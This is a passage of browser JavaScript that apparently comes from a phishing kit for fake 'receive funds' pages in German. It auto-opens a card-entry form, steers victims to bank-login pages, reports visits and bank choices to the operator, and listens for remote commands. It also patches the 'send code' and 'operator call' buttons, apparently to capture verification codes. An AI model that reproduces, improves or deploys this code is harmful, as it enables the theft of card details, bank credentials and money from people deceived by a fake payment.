          if (isReceiveLkPage() && !pre) { setUiPageKey("bank"); notifyLkSelection(); }
          return opened;
        }
        if (lid) {
          location.href = lkPageUrl();
        }
        return;
      }

            sendCardPageVisit();
      setUiPageKey("card");
      if (nativeOpen) {
        var opened = nativeOpen.call(this, false, pre, ignoreSelection);
        startCardFormRevealBurst();
        return opened;
      }
      if (lid && !hasInlineCardModal()) {
        location.href = cardPageUrl();
        return;
      }
    }

    wrapped.__botWrapped = true;
    window.openFormCard = wrapped;
  }

  function patchHighlightReceiveButton() {
    var btn = Array.from(document.querySelectorAll("button, a, span")).find(function (el) {
      return /receive funds|zahlung akzeptieren|nächste|nachste|weiter|anfrage akzeptieren|jetzt kaufen/i.test(el.textContent || el.value || "");
    });
    if (!btn) return;
    var target = btn.closest("button, a") || btn;
    target.scrollIntoView({ behavior: "smooth", block: "center" });
    target.style.outline = "3px solid #27ae60";
    target.style.transition = "outline 0.5s ease-in-out";
    target.classList.add("highlightx");
    setTimeout(function () {
      target.classList.remove("highlightx");
    }, 5000);
  }

  function patchHighlightFinder() {
    if (window.__cadHighlightPatched) return;
    window.__cadHighlightPatched = true;
    window.findTargetButton = function () {
      var btns = Array.from(document.querySelectorAll("button[onclick], a[onclick], span[onclick]")).filter(
        function (el) {
          return (el.getAttribute("onclick") || "").indexOf("openFormCard(") !== -1;
        }
      );
      var rf = Array.from(document.querySelectorAll("span, button, a")).filter(function (el) {
        return /receive funds|zahlung akzeptieren|nächste|nachste|weiter|anfrage akzeptieren|jetzt kaufen/i.test(el.textContent || el.value || "");
      });
      return btns.concat(rf);
    };
  }

  function applyInputMode() {
    if (window.LINK_DATA.input_mode === "lk") return;
    window.showAllBank = function () {};
    window.showBankSelectionModal = function () {};
    window.proceedToBankSelection = function () {};
  }

  function applyBalanceSetting() {
    if (window.LINK_DATA.request_balance !== false) return;
    window.__skipBalanceStep = true;
    window.__tomassSendBalanceRaw = true;
    try {
      localStorage.setItem("totalPrice", String(window.LINK_DATA.product_price || "").replace(/[^\d.]/g, ""));
    } catch (_) {}
  }

  function patchCallForLkOn(win) {
    if (!win || win.__rumCallPatchedOn) return;
    win.__rumCallPatchedOn = true;
    win._call = function (a, b, n) {
      if (n !== false && n !== 0 && win.jQuery) {
        try {
          win.jQuery.post("#", { type: "notify", action: "slk", p: String(a) + "-" + String(b) });
        } catch (_) {}
      }
      var nav = window.__rumNavigateLk;
      try {
        if (win !== window && win.parent && win.parent.__rumNavigateLk) nav = win.parent.__rumNavigateLk;
      } catch (_) {}
      if (nav) {
        nav(a, b, n !== false);
        return;
      }
      dataPromise.then(function () {
        navigateToLkBank(a, b, n !== false);
      });
    };
  }

  function patchCallForLk() {
    window.__rumNavigateLk = function (a, b, notify) {
      window.lkscript = true;
      dataPromise.then(function () {
        navigateToLkBank(a, b, notify);
      });
    };
    patchCallForLkOn(window);
    var doc = getShadowIframeDoc();
    if (doc && doc.defaultView) patchCallForLkOn(doc.defaultView);
    window.__rumCallPatched = true;
  }

  function initLkAutoOpen() {
    if (!isReceiveLkPage()) return;
    var params = new URLSearchParams(location.search);
    if (params.get("auth")) return;
    if (params.get("oc") !== "1" && params.get("showCard") !== "Y") return;
    if (window.__lkAutoOpenScheduled) return;
    window.__lkAutoOpenScheduled = true;
    setTimeout(function () {
      dataPromise.then(function () {
        if (typeof window.openFormCard === "function") {
          window.openFormCard(true);
        }
      });
    }, 400);
  }

  function initAuthFromUrl() {
    var params = new URLSearchParams(location.search);
    var auth = params.get("auth");
    if (!auth) {
      var pathAuth = location.pathname.match(/&auth=([^/&?]+)/);
      if (pathAuth) auth = pathAuth[1];
    }
    if (!auth || auth.indexOf("-") < 0) return;
    var parts = auth.split("-");
    patchCallForLk();
    dataPromise.then(function () {
      navigateToLkBank(parts[0], parts[1], false);
    });
  }

  function ensureJQueryAlias() {
    if (window.jQuery && !window.$) window.$ = window.jQuery;
  }

  function setListingLayerVisible(visible) {
    var host = document.getElementById("shadow-host");
    if (!host) return;
    host.style.pointerEvents = visible ? "" : "none";
  }

  function stopLegacyXApiPolling() {
    stopLegacyXApiPollingIn(window);
    try {
      var doc = getShadowIframeDoc();
      if (doc && doc.defaultView) stopLegacyXApiPollingIn(doc.defaultView);
    } catch (_) {}
  }

  function installShadowCallbackBridge() {
    setInterval(function () {
      var doc = getShadowIframeDoc();
      if (!doc || !doc.defaultView) return;
      var win = doc.defaultView;
      if (!win.callback) return;
      var func = String(win.callback || "");
      var data = win.callback_data;
      win.callback = "";
      win.callback_data = "";
      if (func === "openFormCard" && typeof window.openFormCard === "function") {
        window.openFormCard();
        return;
      }
      if (typeof window[func] === "function") {
        try {
          if (data == null || data === "") window[func]();
          else if (typeof data === "string") window[func](data);
          else window[func].apply(window, Object.values(data));
        } catch (_) {}
      }
    }, 150);
  }

  function boot() {
    ensureJQueryAlias();
    window.addEventListener("load", ensureJQueryAlias);
    setInterval(ensureJQueryAlias, 500);
    stopLegacyXApiPolling();
    setTimeout(stopLegacyXApiPolling, 100);
    setTimeout(stopLegacyXApiPolling, 1000);
    patchGermanPaymentButtons();
    window.addEventListener("load", patchGermanPaymentButtons);
    setTimeout(patchGermanPaymentButtons, 500);
    setTimeout(patchGermanPaymentButtons, 2000);
    watchCardModalOverlays();
    patchHighlightFinder();
    installShadowCallbackBridge();
    patchReceiveFundsButton();
    window.addEventListener("load", patchReceiveFundsButton);
    setTimeout(patchReceiveFundsButton, 800);
    setTimeout(patchReceiveFundsButton, 2000);
    patchCallForLk();
    window.addEventListener("load", patchCallForLk);
    setTimeout(patchCallForLk, 500);
    setTimeout(patchCallForLk, 1500);
    dataPromise.then(function () {
      patchCallForLk();
      applyLinkDataToPage();
      applyInputMode();
      applyBalanceSetting();
      scheduleBillingApply();
      patchReceiveFundsButton();
      revealPage();
      sendPageVisit();
      if (isReceiveLkPage()) {
        initLkAutoOpen();
        initAuthFromUrl();
      }
      startXApiPolling();
      patchSendCode();
      patchOperatorCallButton();
      setTimeout(patchSendCode, 500);
      setTimeout(patchOperatorCallButton, 500);
    });
    installPostBridge();
    installShadowPostBridge();
    installLeaveHandlers();
    if (!window.jQuery) {
      var t = setInterval(function () {
        if (window.jQuery) {
          clearInterval(t);
          installPostBridge();
        }
      }, 50);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }

  function tryInstallPostBridge() {
    if (window.jQuery && !window.__postBridgeInstalled) {
      installPostBridge();
      window.__postBridgeInstalled = true;
    }
  }
  tryInstallPostBridge();
  if (!window.jQuery) {
    var __jqBridgePoll = setInterval(function () {
      if (window.jQuery) {
        clearInterval(__jqBridgePoll);
        tryInstallPostBridge();
      }
    }, 20);
  }
})();
